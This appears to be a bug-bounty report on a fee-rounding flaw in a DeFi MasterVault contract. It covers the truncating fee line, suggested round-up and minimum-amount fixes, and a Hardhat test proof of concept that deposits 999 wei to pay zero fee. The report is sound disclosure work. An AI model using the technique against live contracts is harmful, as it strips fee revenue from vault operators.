## Title
Malicious provider can use MasterVault with zero fee due to integer rounding.

## Brief/Intro
A rounding/truncation issue in the MasterVault fee calculation allows providers to make very small deposits that compute a fee of zero. Because there is no minimum deposit amount check, an attacker can repeatedly make tiny deposits and avoid paying fees.

Affected components:
contracts/masterVault/MasterVault.sol — fee calculation at L427

## Vulnerability Details
MasterVault contract is as follows.
```solidity
File: MasterVault.sol
421: 
422:     /// @dev deducts the fee percentage from the given amount
423:     /// @param amount amount to deduct fee from
424:     /// @param fees fee percentage
425:     function _assessFee(uint256 amount, uint256 fees) private pure returns(uint256 value) {
426:         if(fees > 0) {
427:             uint256 fee = (amount * fees) / 1e6;   // @audit: There is a rounding truncation here!!!
428:             value = amount - fee;
429:         } else {
430:             return amount;
431:         }
432:     }
433: 
```
Let's see L427's code line.
The fee is computed with integer arithmetic and truncation, e.g.:
fee = amount * fees / 1e6
If amount * fees < 1e6, the result truncates to 0. 
For example with fees = 1000 and amount = 999:
fee = 999 * 1000 / 1e6 = 0

There is no minimum deposit amount or explicit requirement that fee > 0, so providers can request tiny amounts and pay no fee.

The same truncation pattern appears in the withdrawal flow as well.

## Impact Details
Financial: Loss of fee revenue for vault owners/managers. Repeated exploitation can cause non-trivial cumulative losses depending on usage patterns.

## Suggested fixes (recommended)
Round up the fee calculation to avoid zero fees for non-zero amounts:
```solidity
fee = (amount * fees + 1e6 - 1) / 1e6
```
(or use a mulDivRoundUp helper to avoid intermediate overflow)

Enforce a minimum fee or minimum deposit amount:
```solidity
require(fee > 0, "Deposit: fee too small");
```
or

```solidity
require(amount >= MIN_DEPOSIT, "Deposit: amount below minimum");
```


## References
https://github.com/lista-dao/lista-dao-contracts/blob/fe130560674f579a3eaa45abdbc39790acb5d754/contracts/masterVault/MasterVault.sol#L427

## Proof of Concept
This is unit test code.
```javascript
File: masterVault.test.js
const { expect, assert } = require("chai");
const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");
const NetworkSnapshotter = require("../helpers/NetworkSnapshotter");

describe("MasterVault", function () {
  // Variables
  let wNative,
    deployer,
    masterVault,
    mockCertToken;

  // External Addresses
  let _wBnb,
    _masterVaultAddress,
    _maxDepositFee = 500000, // 50%
    _maxWithdrawalFee = 500000,
    _maxStrategies = 10;

  async function getTokenBalance(account, token) {
    if (token == _wBnb) {
      return await ethers.provider.getBalance(account);
    }
    const tokenContract = await ethers.getContractAt("ERC20Upgradeable", token);
    return await tokenContract.balanceOf(account);
  }

  async function depositAndAllocate(masterVault, signer, depositAmount) {
    tx = await masterVault.connect(signer).depositETH({ value: depositAmount });
    await masterVault.allocate();
  }

  const networkSnapshotter = new NetworkSnapshotter();

  // Deploy and Initialize contracts
  before(async function () {
    [deployer, signer1, signer2, signer3] = await ethers.getSigners();

    const WNative = await ethers.getContractFactory("WNative");
    const MasterVault = await hre.ethers.getContractFactory("MasterVault");
    const MockCertToken = await ethers.getContractFactory("MockCertToken");
    
    // deploy wNative
    wNative = await WNative.connect(deployer).deploy();
    await wNative.waitForDeployment();
    _wBnb = await wNative.getAddress();    

    // deploy CertToken
    mockCertToken = await MockCertToken.connect(deployer).deploy();
    await mockCertToken.waitForDeployment();
    const mockCertTokenAddress = await mockCertToken.getAddress();

    // deploy MasterVault
    masterVault = await upgrades.deployProxy(
      MasterVault,
      [
        // "CEROS BNB Vault Token",
        // "ceBNB",
        _maxDepositFee,
        _maxWithdrawalFee,
        _maxStrategies,
        mockCertTokenAddress
      ],
      { initializer: "initialize" }
    );
    await masterVault.waitForDeployment();
    _masterVaultAddress = await masterVault.getAddress();

    await masterVault.changeProvider(signer1.address);
  });

  describe("Deposit functionality", async () => {
    it.only("Deposit: Deposit to MasterVault without fee!!!(deposit fee: 0.1%)", async function () {
      let fee = 1000; // 0.1%
      depositAmount = ethers.parseUnits("999", "wei");

      await masterVault.connect(deployer).setDepositFee(fee);
      
      tx = await masterVault
        .connect(signer1)
        .depositETH({ value: depositAmount });
      receipt = await tx.wait(1);
      
      feeEarned = await masterVault.feeEarned();
      console.log('MasterVault feeEarned', Number(feeEarned));

      assert.equal(
        feeEarned > 0,
        true
      );
    });

  });
});
```

```javascript
File: MockCertToken.sol
// SPDX-License-Identifier: GPL-3.0-only
pragma solidity ^0.8.10;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../ceros/interfaces/ICertToken.sol";

contract MockCertToken is ICertToken, ERC20 {
    constructor() ERC20("Mock Cert Token", "MockCert") {
    }

    function mint(address account, uint256 amount) public {
        _mint(account, amount);
    }

    function burn(address account, uint256 amount) public {
        _burn(account, amount);
    }

    function balanceWithRewardsOf(address account) external returns (uint256) {
        return 0;
    }

    function isRebasing() external returns (bool) {
        return false;
    }

    function ratio() external view returns (uint256) {
        return 1;
    }

    function bondsToShares(uint256 amount) external view returns (uint256) {
        return 1;
    }
}
```

To run this test code, please run
```
npx run hardhat
```